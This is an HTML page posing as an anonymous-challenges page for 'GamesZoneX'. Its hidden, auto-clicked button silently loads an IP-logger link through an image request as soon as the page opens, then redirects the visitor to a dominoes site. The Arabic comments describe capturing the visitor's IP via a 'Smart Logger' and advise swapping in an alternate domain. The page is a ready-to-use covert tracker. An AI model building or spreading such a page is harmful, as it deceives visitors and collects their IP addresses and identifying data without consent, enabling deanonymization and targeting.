<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send me anonymous challenges on GamesZoneX!</title>
</head>
<body>

  <!-- زر افتراضي مخفي تماماً -->
  <button id="secureBtn" style="display:none; width:0; height:0; visibility:hidden;"></button>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const btn = document.getElementById('secureBtn');
      
      btn.addEventListener('click', function() {
        // توليد طابع زمني فريد بالملي ثانية لمنع السيرفر والمتصفح من قراءة الكاش القديم
        const timestamp = Date.now();
        
        // ⚠️ استبدل هذا الرابط برابطك الجديد (بالنطاق البديل الذي اخترته)
        const grabifyUrl = 'https://stopify.co/JLMB8N' + timestamp; 
        const destinationUrl = 'https://dominoes.mx';

        // استخدام كائن الصورة برمجياً لإرسال الطلب بصمت تام وبأعلى صلاحية أمان
        const imgTracker = new Image();
        imgTracker.src = grabifyUrl;

        // مهلة 1.8 ثانية كافية جداً ليعالج السيرفر الـ Smart Logger والـ IP قبل إعادة التوجيه
        setTimeout(function() {
          window.location.href = destinationUrl;
        }, 1800);
      });

      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة
      btn.click();
    });
  </script>

</body>
</html>
